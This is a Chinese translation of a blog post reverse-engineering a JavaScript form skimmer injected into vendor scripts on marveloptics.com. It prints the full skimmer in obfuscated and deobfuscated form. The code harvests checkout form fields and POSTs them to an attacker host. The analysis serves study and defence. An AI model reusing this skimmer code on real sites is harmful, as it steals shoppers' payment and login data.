# 逆marveloptics.com上的JS恶意软件

阅读量 **271358**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-07-26 16:00:35

 **x**

##### 译文声明

本文是翻译文章，文章来源：blog.jse.li

原文地址：<https://blog.jse.li/posts/marveloptics-malware/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01c7399f58e111c3bc.jpg)

译文仅供参考，具体内容表达以及含义原文为准

## 前言

一些注入脚本经常用来窃取你的数据，并将其发送给攻击者。但是不得不说，其中一些攻击者的编程技术真的很拙劣。  
近日，我妈妈正在浏览网站想购买一副新眼镜，在访问marveloptics.com时，她的防病毒软件开始预警某些恶意JavaScript脚本。而我总是很好奇病毒是如何工作，实现攻击的，所以我对其进行了逆向分析。  
该恶意文件可下载于

    
    
    [https://github.com/veggiedefender/marveloptics_malware
    ](https://github.com/veggiedefender/marveloptics_malware)

## 定位

攻击者将他们的恶意代码注入了像modernizr和openid这样的文件中，这将为他们提供一些好处：  
1.因为库的原因，这使得发现混淆后的恶意代码变得更难。  
2.因为开发人员不经常更新其依赖关系，注入的恶意软件可以在应用程序代码更新后继续存在。

    
    
    https://www.marveloptics.com/templates/moptics/js/vendor/modernizr.js
    https://www.marveloptics.com/libraries/openid/openid.js
    

## Deobfuscating.js

带有恶意代码的文件：`modernizr.js`和`openid.js`  
它们包含完全相同的恶意代码，并且显然使用`javascriptobfuscator.com`的模糊处理。  
幸运的是，`js-beautify`可以专门对这些脚本进行反混淆处理。

    
    
    $ js-beautify -x -s 2 original/openid.js > 
    deobfuscated.js
    
    
    
    var i3692386a609ff6fd204a1418521ec651 = {
      snd: null,
      o7d6e88f271f3ac078a708f7123e10e14: "https://webfotce.me/js/form.js",
      myid: (function(_0x79e5x2) {
        var _0x79e5x3 = document["cookie"]["match"](new RegExp("(?:^|; )" + _0x79e5x2["replace"](/([.$?*|{}()[]\/+^])/g, "\$1") + "=([^;]*)"));
        return _0x79e5x3 ? decodeURIComponent(_0x79e5x3[1]) : undefined
      })("setidd") || (function() {
        var _0x79e5x4 = new Date();
        var _0x79e5x5 = _0x79e5x4["getTime"]() + "-" + Math["floor"](Math["random"]() * (999999999 - 11111111 + 1) + 11111111);
        var _0x79e5x6 = new Date(new Date()["getTime"]() + 60 * 60 * 24 * 1000);
        document["cookie"] = "setidd=" + _0x79e5x5 + "; path=/; expires=" + _0x79e5x6["toUTCString"]();
        return _0x79e5x5
      })(),
      clk: function() {
        i3692386a609ff6fd204a1418521ec651["snd"] = null;
        var _0x79e5x7 = document["querySelectorAll"]("input, select, textarea, checkbox, button");
        for (var _0x79e5x8 = 0; _0x79e5x8 < _0x79e5x7["length"]; _0x79e5x8++) {
          if (_0x79e5x7[_0x79e5x8]["value"]["length"] > 0) {
            var _0x79e5x9 = _0x79e5x7[_0x79e5x8]["name"];
            if (_0x79e5x9 == "") {
              _0x79e5x9 = _0x79e5x8
            };
            i3692386a609ff6fd204a1418521ec651["snd"] += _0x79e5x7[_0x79e5x8]["name"] + "=" + _0x79e5x7[_0x79e5x8]["value"] + "&"
          }
        }
      },
      send: function() {
        try {
          var _0x79e5xa = document["querySelectorAll"]("a[href*='javascript:void(0)'],button, input, submit, .btn, .button");
          for (var _0x79e5x8 = 0; _0x79e5x8 < _0x79e5xa["length"]; _0x79e5x8++) {
            var _0x79e5xb = _0x79e5xa[_0x79e5x8];
            if (_0x79e5xb["type"] != "text" && _0x79e5xb["type"] != "select" && _0x79e5xb["type"] != "checkbox" && _0x79e5xb["type"] != "password" && _0x79e5xb["type"] != "radio") {
              if (_0x79e5xb["addEventListener"]) {
                _0x79e5xb["addEventListener"]("click", i3692386a609ff6fd204a1418521ec651["clk"], false)
              } else {
                _0x79e5xb["attachEvent"]("onclick", i3692386a609ff6fd204a1418521ec651["clk"])
              }
            }
          };
          var _0x79e5xc = document["querySelectorAll"]("form");
          for (vari = 0; _0x79e5x8 < _0x79e5xc["length"]; _0x79e5x8++) {
            if (_0x79e5xc[_0x79e5x8]["addEventListener"]) {
              _0x79e5xc[_0x79e5x8]["addEventListener"]("submit", i3692386a609ff6fd204a1418521ec651["clk"], false)
            } else {
              _0x79e5xc[_0x79e5x8]["attachEvent"]("onsubmit", i3692386a609ff6fd204a1418521ec651["clk"])
            }
          };
          if (i3692386a609ff6fd204a1418521ec651["snd"] != null) {
            var _0x79e5xd = location["hostname"]["split"](".")["slice"](0)["join"]("_") || "nodomain";
            var _0x79e5xe = btoa(i3692386a609ff6fd204a1418521ec651["snd"]);
            var _0x79e5xf = new XMLHttpRequest();
            _0x79e5xf["open"]("POST", i3692386a609ff6fd204a1418521ec651["o7d6e88f271f3ac078a708f7123e10e14"], true);
            _0x79e5xf["setRequestHeader"]("Content-type", "application/x-www-form-urlencoded");
            _0x79e5xf["send"]("info=" + _0x79e5xe + "&hostname=" + _0x79e5xd + "&key=" + i3692386a609ff6fd204a1418521ec651["myid"])
          };
          i3692386a609ff6fd204a1418521ec651["snd"] = null;
          _0x79e5xe = null;
          setTimeout(function() {
            i3692386a609ff6fd204a1418521ec651["send"]()
          }, 30)
        } catch (e) {}
      }
    };
    if ((new RegExp("onepage|checkout|onestep", "gi"))["test"](window["location"])) {
      i3692386a609ff6fd204a1418521ec651["send"]()
    }
    

wow，这变得好一些了，但是接下来是查找和替换混淆后的变量名以及添加注释依旧是个繁琐工作：

    
    
    var Malware = {
      data: null,
      url: "https://webfotce.me/js/form.js",
      myid: (function(cookieName) {
        // Check setidd cookie for id
        var id = document.cookie.match(new RegExp("(?:^|; )" + cookieName.replace(/([.$?*|{}()[]\/+^])/g, "\$1") + "=([^;]*)"));
        return id ? decodeURIComponent(id[1]) : undefined;
      })("setidd") || (function() {
        // If the setidd cookie doesn't exist, then generate a new id and save it in the setidd cookie
        // IDs look like 1529853014535-289383517
        // Unix timestamp (ms), a dash, and a long random number
        var timestamp = new Date();
        var id = timestamp.getTime() + "-" + Math.floor(Math.random() * (999999999 - 11111111 + 1) + 11111111);
        var expiration = new Date(new Date().getTime() + 60 * 60 * 24 * 1000); // Cookie expires in 24 hours
        document.cookie = "setidd=" + id + "; path=/; expires=" + expiration.toUTCString();
        return id;
      })(),
      stealData: function() {
        // Serializes the values of inputs, dropdowns, textareas, checkboxes, and buttons (?)
        // Saves them in Malware.data
        Malware.data = null;
        var elements = document.querySelectorAll("input, select, textarea, checkbox, button");
        for (var i = 0; i < elements.length; i++) {
          if (elements[i].value.length > 0) {
            var name = elements[i].name;
            if (name == "") {
              name = i;
            };
            Malware.data += elements[i].name + "=" + elements[i].value + "&";
          }
        }
      },
      send: function() {
        try {
          // When the user clicks any buttons or form inputs, run stealData
          var elements = document.querySelectorAll("a[href*='javascript:void(0)'],button, input, submit, .btn, .button");
          for (var i = 0; i < elements.length; i++) {
            var element = elements[i];
            if (element.type != "text" && element.type != "select" && element.type != "checkbox" && element.type != "password" && element.type != "radio") {
              if (element.addEventListener) {
                element.addEventListener("click", Malware.stealData, false);
              } else {
                element.attachEvent("onclick", Malware.stealData);
              }
            }
          };
    
          // When the user submits a form, run stealData
          var formElements = document.querySelectorAll("form");
          for (vari = 0; i < formElements.length; i++) { // Yes, this is their typo!
            if (formElements[i].addEventListener) {
              formElements[i].addEventListener("submit", Malware.stealData, false);
            } else {
              formElements[i].attachEvent("onsubmit", Malware.stealData);
            }
          };
    
          // If there's any data to send, then send it to configured url
          if (Malware.data != null) {
            var hostname = location.hostname.split(".").slice(0).join("_") || "nodomain";
            var data = btoa(Malware.data); // base64 encoded
            var xhr = new XMLHttpRequest();
            xhr.open("POST", Malware.url, true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.send("info=" + data + "&hostname=" + hostname + "&key=" + Malware.myid);
          };
          Malware.data = null;
          data = null;
          setTimeout(function() {
            Malware.send();
          }, 30); // This whole function runs every 30 milliseconds!
        } catch (e) {}
      }
    };
    
    // Only run on pages with worthwhile info
    if ((new RegExp("onepage|checkout|onestep", "gi")).test(window.location)) {
      Malware.send();
    }
    

## 上述代码分析

让我们一步一步来揭示上述代码的作用吧

###  开始分析

    
    
    // Only run on pages with worthwhile info
    if ((new RegExp("onepage|checkout|onestep", "gi")).test(window.location)) {
      Malware.send();
    }
    

这是整个脚本的入口点，如果该页面是结账页面，那么它将调用send()函数

###  声明主对象

    
    
    var Malware = {
      data: null,
      url: "https://webfotce.me/js/form.js",
    

我将对象重命名为`Malware`，并且大部分代码都存在于此对象中。  
data最终将存储用户的被盗数据，这些数据都将被发送到url。

###  识别用户

    
    
    myid: (function(cookieName) {
      // Check setidd cookie for id
      var id = document.cookie.match(new RegExp("(?:^|; )" + cookieName.replace(/([.$?*|{}()[]\/+^])/g, "\$1") + "=([^;]*)"));
      return id ? decodeURIComponent(id[1]) : undefined;
    })("setidd") || (function() {
      // If the setidd cookie doesn't exist, then generate a new id and save it in the setidd cookie
      // IDs look like 1529853014535-289383517
      // Unix timestamp (ms), a dash, and a long random number
      var timestamp = new Date();
      var id = timestamp.getTime() + "-" + Math.floor(Math.random() * (999999999 - 11111111 + 1) + 11111111);
      var expiration = new Date(new Date().getTime() + 60 * 60 * 24 * 1000); // Cookie expires in 24 hours
      document.cookie = "setidd=" + id + "; path=/; expires=" + expiration.toUTCString();
      return id;
    })(),
    

`myid`存储用户的标识ID字符串  
在第一个块中，程序检查一个名为`setidd`的cookie。  
如果它存在（受害者是返回用户），则会解析cookie的ID，并将其存储到myid。  
但是，如果cookie不存在，那么就会产生一个新的ID，并将其保存在`myid`和名为`setidd`的cookie中，它的有效期为24小时。  
而ID由当前的unix时间戳，短划线和长随机数组成，看起来像`1529853014535-289383517`。

###  数据窃取

    
    
    stealData: function() {
      // Serializes the values of inputs, dropdowns, textareas, checkboxes, and buttons (?)
      // Saves them in Malware.data
      Malware.data = null;
      var elements = document.querySelectorAll("input, select, textarea, checkbox, button");
      for (var i = 0; i < elements.length; i++) {
        if (elements[i].value.length > 0) {
          var name = elements[i].name;
          if (name == "") {
            name = i;
          };
          Malware.data += elements[i].name + "=" + elements[i].value + "&";
        }
      }
    },
    

首先，它通过将其设置为null清除data。然后，它在页面上查找所有文本输入，并以以下格式保存其名称和值：

    
    
    username=admin&password=hunter2
    

但实际上，因为data作为null而开始程序，程序串给它拼接新的值后，最终看起来更像是这样的：

    
    
    nullusername=admin&password=hunter2
    

###  send()函数

    
    
    send: function() {
      try {
        // ...
      } catch (e) {}
    }
    

这些是专业开发人员设计的代码，对于错误的捕捉做的很好，不用担心程序错误使它们结果受到影响

###  添加事件侦听器

    
    
    // When the user clicks any buttons or form inputs, run stealData
    var elements = document.querySelectorAll("a[href*='javascript:void(0)'],button, input, submit, .btn, .button");
    for (var i = 0; i < elements.length; i++) {
      var element = elements[i];
      if (element.type != "text" && element.type != "select" && element.type != "checkbox" && element.type != "password" && element.type != "radio") {
        if (element.addEventListener) {
          element.addEventListener("click", Malware.stealData, false);
        } else {
          element.attachEvent("onclick", Malware.stealData);
        }
      }
    };
    

恶意软件会为页面上的所有按钮注入一个事件监听器  
因此当用户单击其中任何一个按钮时，它们会再次运行`stealData()`。  
如果不存在，则测试`element.addEventListener`并且使用`element.attachEvent`

    
    
    // When the user submits a form, run stealData
    var formElements = document.querySelectorAll("form");
    for (vari = 0; i < formElements.length; i++) { // Yes, this is their typo!
      if (formElements[i].addEventListener) {
        formElements[i].addEventListener("submit", Malware.stealData, false);
      } else {
        formElements[i].attachEvent("onsubmit", Malware.stealData);
      }
    };
    

他们也试图在表单提交时做同样的事情，然而，他们写错了一个字：  
应该写为`var i = 0`，而不是`vari = 0`。  
这样就创建了一个名为`vari`的全局变量并将其值设置为0。  
幸运的是，i在之前的循环里已被作用过，所以，i的值肯定是高于0或是`formElements.length`的，这就意味着循环体实际上从未运行过

###  发送数据

    
    
    // If there's any data to send, then send it to configured url
    if (Malware.data != null) {
      var hostname = location.hostname.split(".").slice(0).join("_") || "nodomain";
      var data = btoa(Malware.data); // base64 encoded
      var xhr = new XMLHttpRequest();
      xhr.open("POST", Malware.url, true);
      xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      xhr.send("info=" + data + "&hostname=" + hostname + "&key=" + Malware.myid);
    };
    

如果对象里面有任何data数据（由stealData()函数赋值），则将其发送到攻击者的域名。  
所有内容data都经过base64编码，因此它不会与其余的POST请求发生冲突，其中包括ID和当前页面的主机名（由于某种原因，点会转换为下划线）。

###  清理并再次运行

    
    
    Malware.data = null;
    data = null;
    setTimeout(function() {
      Malware.send();
    }, 30); // This whole function runs every 30 milliseconds!
    

send每30毫秒递归调用一次，可以说攻击者真的不关心程序的性能。

## 大体时间

根据互联网档案快照，[marveloptics.com](http://marveloptics.com)自2017年1月至6月期间已被感染，这意味着他们过去一年的所有客户都被窃取了信息。  
而我今年6月24日通过电子邮件向`[customerservice@marveloptics.com](mailto:customerservice@marveloptics.com)`发送了详细信息，但尚未收到回复。

本文翻译自blog.jse.li [原文链接](https://blog.jse.li/posts/marveloptics-malware/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **一叶飘零** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/152810](/post/id/152810)

安全客 - 有思想的安全新媒体

本文转载自: [blog.jse.li](https://blog.jse.li/posts/marveloptics-malware/)

如若转载,请注明出处： <https://blog.jse.li/posts/marveloptics-malware/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)
  * [逆向](/tag/逆向)
  * [Javascript](/tag/Javascript)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t0115eb10739cb26739.png) 一叶飘零

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

